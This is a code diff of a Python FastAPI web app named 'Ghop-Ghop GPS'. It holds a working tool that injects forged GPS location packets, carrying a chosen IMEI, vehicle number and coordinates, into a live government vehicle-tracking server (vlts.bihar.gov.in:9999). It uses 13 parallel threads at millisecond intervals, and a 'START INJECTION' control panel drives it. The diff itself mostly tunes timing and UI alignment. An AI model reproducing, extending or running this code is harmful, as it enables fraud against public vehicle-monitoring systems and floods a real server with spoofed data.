@@ -2,7 +2,7 @@ import socket, threading, time, requests, json, asyncio
 from datetime import datetime, timedelta, timezone
 from fastapi import FastAPI, BackgroundTasks
 from fastapi.responses import HTMLResponse
-import httpx # Async Database operations ke liye
+import httpx 
 
 app = FastAPI()
 
@@ -10,33 +10,35 @@ app = FastAPI()
 DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
 firing = False
 total_sent = 0
-lock = threading.Lock() # Atomic counter synchronization
+lock = threading.Lock() 
 TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]
 
-# --- 🏎️ TURBO ENGINE WITH CONNECTION POOLING ---
+# --- 🏎️ TURBO ENGINE (SERVER SYNC OPTIMIZED) ---
 def handshake_worker(tag, imei, vno, lat, lon):
     global firing, total_sent
     while firing:
         try:
-            # Connection Pooling: Reuse socket to bypass TCP Handshake overhead
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(5)
-                s.connect(("vlts.bihar.gov.in", 9999))
-                
-                while firing:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) 
+            s.settimeout(5)
+            s.connect(("vlts.bihar.gov.in", 9999))
+            
+            while firing:
+                for _ in range(15):
+                    if not firing: break
                     now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                     dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
                     pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
                     
                     s.sendall(bytes(pkt, 'ascii'))
-                    
-                    # Atomic Thread-Safe Counter
                     with lock:
                         total_sent += 1
-                    
-                    time.sleep(0.01) # Ultra-fast non-blocking injection
+                    time.sleep(0.005) 
+                time.sleep(0.05) 
         except:
-            time.sleep(0.5) # Fast Reconnect Logic
+            try: s.close()
+            except: pass
+            time.sleep(0.5) 
 
 @app.get("/fetch_data")
 async def fetch_data(vno: str):
@@ -55,12 +57,9 @@ async def init(v:str, i:str, lt:str, ln:str, background_tasks: BackgroundTasks):
     if not firing:
         v_up = v.upper().strip()
         firing, total_sent = True, 0
-        
-        # Async Background Task for DB update to keep Engine free
         now_ist = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
         payload = {"Vehicle_No": v_up, "IMEI_No": i, "Lat": lt, "Lon": ln, "Status": "Active", "Start": now_ist.strftime('%H:%M:%S')}
         background_tasks.add_task(update_db_records, v_up, payload)
-        
         for tag in TAGS:
             threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
     return {"ok": True}
@@ -75,7 +74,7 @@ def status(): return {"c": total_sent, "f": firing}
 @app.get("/stop")
 def stop(): global firing; firing = False; return {"ok": True}
 
-# --- 🎨 FINAL MASTER UI (MOBILE OPTIMIZED + PRESTIGE LOOK) ---
+# --- 🎨 FINAL UI (FIXED ALIGNMENT + MOBILE OPTIMIZED) ---
 @app.get("/", response_class=HTMLResponse)
 async def home():
     return """
@@ -98,7 +97,11 @@ async def home():
         .wall-msg { color:red; font-weight:bold; }
         #map { width:100%; height:250px; margin-top:15px; border:1px solid #0f0; border-radius:10px; background:#111; }
         .nav { width:95%; max-width:440px; display:flex; justify-content:space-between; font-size:12px; margin-top:10px; color:#fff; }
-        .chk-group { display:flex; align-items:center; gap:8px; margin-top:10px; font-size:12px; }
+        
+        /* Fixed Alignment for Checkboxes */
+        .chk-group { display:flex; align-items:center; justify-content:center; gap:10px; margin-top:15px; font-size:13px; width:100%; }
+        .chk-group input[type="checkbox"] { width:20px; height:20px; margin:0; cursor:pointer; }
+        
         #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:2000; justify-content:center; align-items:center; }
         .popup { width:90%; max-width:350px; border:2px solid #ff0; padding:20px; background:#111; color:#fff; text-align:center; border-radius:15px; box-shadow: 0 0 30px #ff0; box-sizing: border-box; }
     </style></head><body>
@@ -109,8 +112,13 @@ async def home():
         <h1 style="text-align:center;font-size:24px;letter-spacing:5px;">Ghop-Ghop GPS</h1>
         <input type="text" id="m_num" placeholder="MOBILE NUMBER">
         <input type="password" id="m_pass" placeholder="PASSWORD">
-        <div class="chk-group"><input type="checkbox" id="rem"> <label>Remember Me</label></div>
-        <button onclick="login()" style="background:#0f0;color:#000;border:none;">ACCESS SYSTEM</button>
+        
+        <div class="chk-group">
+            <input type="checkbox" id="rem"> 
+            <label for="rem">Remember Me</label>
+        </div>
+        
+        <button onclick="login()" style="background:#0f0;color:#000;border:none;margin-top:20px;">ACCESS SYSTEM</button>
     </div>
 
     <div class="nav" id="dashNav" style="display:none;"><span>USER: <b id="u_name" style="color:#0f0"></b></span><span onclick="logout()" style="color:red;cursor:pointer;font-weight:bold;">[ LOGOUT ]</span></div>
@@ -122,8 +130,13 @@ async def home():
         <div class="user-wall" id="u_wall"></div>
         <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
         <input type="text" id="i" placeholder="IMEI">
-        <div class="chk-group"><input type="checkbox" id="useDef" checked> <label>Use Default Location (Profile)</label></div>
-        <div style="display:flex;gap:5px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
+        
+        <div class="chk-group">
+            <input type="checkbox" id="useDef" checked> 
+            <label for="useDef">Use Default Location (Profile)</label>
+        </div>
+        
+        <div style="display:flex;gap:5px;margin-top:10px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
         <button onclick="getLocation()">[ GET CURRENT LOCATION ]</button>
         <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;border:none;">START INJECTION</button>
         <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
